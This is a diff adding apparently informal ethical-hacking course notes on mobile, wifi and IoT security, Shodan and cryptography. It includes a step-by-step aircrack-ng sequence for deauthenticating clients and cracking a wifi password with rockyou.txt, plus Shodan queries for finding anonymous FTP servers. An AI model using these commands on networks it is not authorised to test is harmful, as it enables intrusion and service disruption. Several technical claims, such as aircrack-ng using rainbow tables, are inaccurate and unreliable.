@@ -1,0 +1,171 @@
+POC or precautions for mobile hacking : 
+regualrly check installed apps
+SEP mobile - symantec 
+Incognito app : for spyware detection
+norton mobile security and antivirus
+glasswire data usage monitor
+
+
+Juice jacking : 
+Has happened in top 7 airports in india
+hardware hacking in the frree charging ports present in public cases which gives hacker the access to the device
+
+
+Hacking wireless networks : 
+
+wifi routers :
+attacker can manipulate other devices in the network if he can tak control over router
+ 
+Rouge attack :
+same hotspot name and performs kind of DOS attacks
+Evil twin attack : 
+same hotspot name and capture the data packets
+
+Password cracking techniques:
+Default passwords
+Brute forcing
+Password Guessing
+Rainbow table attack :
+	The password are hashed in wifi networks
+In this technique hacker creates a list of hashed password and comapres withhem the stolen hashed passwords from the databases
+
+kali linux tools used :
+airmon-ng
+airodump-ng
+aireplay-ng
+aircrack-ng
+
+By default wifi adapters will be in access point mode(receiving)
+the attacker needs to chnage it to monitor mode to get info abt the wireless networks
+
+airmon-ng : AP mode to montor mode
+airodump-ng : dumps wireless datapackets
+aireplay-ng:perforsm DOS attack to make the devices to get disconnected from the network forcibly
+aircrack-ng:uses to decrypt the files and to get the plain text of password using rainbow table attack
+
+inbuilt kali linux password file in the path
+/usr/share/wordlists/rockyou.txt.gz
+
+to unzipx use gunszip 
+gunzip /usr/share/wordlists/rockyou.txt.gz
+
+To kill the networking manager
+airmon-ng check kill
+
+airmon-ng start wlan0
+
+airodump-ng wlan0mon
+airodump-ng --bssid <macaddr> -c <channelno> -w EUI wlan0mon
+in another terminal :
+aireplay-ng -a <router bssid> -c 11 --deauth 1000 wlanmon
+
+new terminal :
+aircrak-ng -b <target bssid> -w /usr/share/wordlists/rockyou.txt EUI-01.cap
+
+service network-manager start
+service networking start
+
+-------------------------------------------------------------------------------
+Part 2
+Counter measures for the wifi password cracking attack:
+
+Diable the WPS feature in your router.
+After the work is done, forget the wifi network
+Pineapple router : used by attackers to find all the available networks in a range
+Enable MAC address Filtering in your routers
+make router into hidden mode
+Reset your router monthly once
+Change the wifi password frequently
+
+Rlogin : Remote login services
+
+IOT Hacking :
+
+OWASP has given top 10 IOT vulns:
+
+1.weak guessable or hardcoded passwords
+2.insecure network services
+3.insecure Ecosytem interfaces
+4.Lack of secure Update mechanism
+5.use of insecure or outdated Components
+6.Insufficient privacy protection
+7.insecure data transfer and storage
+8.lack of device mangement
+9.insecure default settings
+10.lack of physical hardening
+-------------------------------------------------------------------------------------------
+Part 3
+
+Shodan is used to find the IOT devices with vulns
+Iot devices can be found out using the CVE vuln number
+***ASN : Autonomous System number : like a pincode for internet addressess
+A range of ip addresses are maintained in the ASN number and given to the isp providers
+AS12874
+
+ASN number is used to find the location of an attacker if he is not using a good VPN
+
+Shodan can be used to find vulns for a product databses like:
+MySQL
+postgresql etc....
+
+Use the shodan queries and can get info abt the vulns from shodan
+EX : product:MySQL
+
+we can info based on OS,country,versions, and diff categories
+
+**WE can find FTP servers which have anonymous logins
+
+Search query in shodan :
+
+'anonymous@' login ok
+Anonymous user logged in
+Only anonymous FTP is allowed here
+Anonymous access granted, restrictions apply
+230 Login successful
+
+
+in kali linux:
+ftp <target ip addr>
+
+
+Hydra : kali linux password bruteforcing
+hydra -h
+
+it is used to break passwords using brute force attacks
+
+
+Cryptography:
+Cipher text
+
+Types :
+1.Symmetric : same key is used for e and d
+2.Asymmetric : diff key for e and d public and pprivate key
+	 GAK key : Govt accessed to keys
+
+
+CRYPTOGRAPHICAL ENCRYPTION ALGORITHMS:
+1. CIPHERS
+2. SUBSTITUTIONS
+3.
+4. KEYS
+5. DES ALGORITHM
+6. AES ALGORITHM
+7. RC4, RC5,RC6
+8. RSA(RIVEST SHAMIR ADLEMAN)
+POLYALPHABETICS
+
+CRYPTOGRAPHICAL HASHING ALGORITHMS:
+1. MD, MD4,MD5 (MESSAGE DIGEST)
+2. SHA (SECURE HASH ALGORITHM)
+SHA-1
+SHA-2
+SHA-256
+SHA-512
+
+
+Hashing algo :
+once a text is hashed it cannot be rehashed 
+it is used to identify integrity
+if changes during transmission are performed the hash value will be effected and then the integrity is compromised
+
+hasing done in two diff platforms will result in the same hash value
